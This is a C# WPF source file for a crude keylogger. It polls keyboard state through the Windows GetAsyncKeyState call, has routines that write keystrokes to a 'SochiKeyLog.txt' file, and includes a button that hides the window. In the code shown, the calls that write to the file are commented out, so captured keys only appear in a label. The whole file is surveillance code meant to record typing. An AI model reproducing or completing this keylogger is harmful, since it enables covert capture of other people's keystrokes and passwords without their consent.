using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Drawing;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Threading;



namespace WpfApplication8
{

    public partial class MainWindow : Window
    {
        bool condition = false;
        

        StreamWriter file = new StreamWriter(@"SochiKeyLog.txt");
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern Int16 GetAsyncKeyState(int key);
        
        public void Save_With_Big_Letters(int key)
        {
            switch(key)
            {
                case 96:
                    file.Write("0");
                    break;
                case 97:
                    file.Write("1");
                    break;
                case 98:
                    file.Write("2");
                    break;
                case 99:
                    file.Write("3");
                    break;
                case 100:
                    file.Write("4");
                    break;
                case 101:
                    file.Write("5");
                    break;
                case 102:
                    file.Write("6");
                    break;
                case 103:
                    file.Write("7");
                    break;
                case 104:
                    file.Write("8");
                    break;
                case 105:
                    file.Write("9");
                    break;
                default:
                    file.Write((char)key);
                    break;
            }
        }
        public void Save_With_Small_Letters(int key)
        {
            switch (key)
            {
                case 96:
                    file.Write("0");
                    break;
                case 97:
                    file.Write("1");
                    break;
                case 98:
                    file.Write("2");
                    break;
                case 99:
                    file.Write("3");
                    break;
                case 100:
                    file.Write("4");
                    break;
                case 101:
                    file.Write("5");
                    break;
                case 102:
                    file.Write("6");
                    break;
                case 103:
                    file.Write("7");
                    break;
                case 104:
                    file.Write("8");
                    break;
                case 105:
                    file.Write("9");
                    break;
                default:
                    file.Write((char)(key));
                    break;
            }
        }
        public MainWindow()
        {
            InitializeComponent();
        }
        public void Window_KeyDown(object sender, KeyEventArgs e)
        {
            if (condition == true)
            {
                int key;
                int keyState;
                for (key = 0; key < 127; key++)
                {
                    keyState = GetAsyncKeyState(key);
                    if (keyState == 1 || keyState == -32767)
                    {
                        if(Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift ))
                        {
                            //Save_With_Big_Letters(key);
                            label.Content = e.Key.ToString();
                        }
                        else
                        {
                            //Save_With_Small_Letters(key);
                            label.Content = e.Key.ToString().ToLower();
                        }
                    }
                }
            }     
        }
        public void Button_Click(object sender, RoutedEventArgs e)
        {
            condition = true;
        }
        public void Button_Click_1(object sender, RoutedEventArgs e)
        {
            condition = false;
            file.Close();
        }
        public void Window_Closing(object sender, CancelEventArgs e)
        {
            file.Close();
        }
        public void Window_Closed(object sender, EventArgs e)
        {
            file.Close();
        }
        public void Hide_Click(object sender, RoutedEventArgs e)
        {
            this.Hide();
        }
    }
}


